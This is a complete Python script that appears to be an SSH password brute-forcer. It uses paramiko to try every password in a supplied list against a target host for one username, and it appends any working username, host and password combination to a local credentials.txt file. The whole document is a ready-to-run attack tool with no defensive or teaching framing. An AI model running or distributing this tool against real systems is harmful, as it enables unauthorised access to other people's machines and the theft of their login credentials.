import paramiko
import socket
import time
import argparse
from colorama import init, Fore

# Initialize Colorama for colored output
init()

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
        print(f"{Fore.GREEN}[+] Found Combo: {username}@{hostname}:{password}{Fore.RESET}")
        # Save successful credentials to a file
        with open("credentials.txt", "a") as f:
            f.write(f"{username}@{hostname}:{password}\n")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Invalid Combo: {username}@{hostname}:{password}")
        return False
    except socket.timeout:
        print(f"[-] Host: {hostname} Timeout")
        return False
    except paramiko.SSHException as e:
        print(f"[-] SSH Error for {username}@{hostname}: {e}")
        time.sleep(1) # Add a small delay for SSH errors
        return False
    except Exception as e:
        print(f"[-] General Error for {username}@{hostname}: {e}")
        return False
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(description="Basic SSH Brute-Forcer")
    parser.add_argument("host", help="Target Hostname or IP Address")
    parser.add_argument("-u", "--username", required=True, help="Single Username to test")
    parser.add_argument("-p", "--passlist", required=True, help="Path to Password List file")

    args = parser.parse_args()

    hostname = args.host
    username = args.username
    passlist_path = args.passlist

    try:
        with open(passlist_path, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Error: Password list file '{passlist_path}' not found.{Fore.RESET}")
        return

    print(f"[!] Starting brute-force on {hostname} for user {username} with {len(passwords)} passwords...")

    for password in passwords:
        if is_ssh_open(hostname, username, password):
            print(f"{Fore.GREEN}[***] Brute-force complete! Found valid credentials.{Fore.RESET}")
            break # Stop if a combo is found

if __name__ == "__main__":
    main()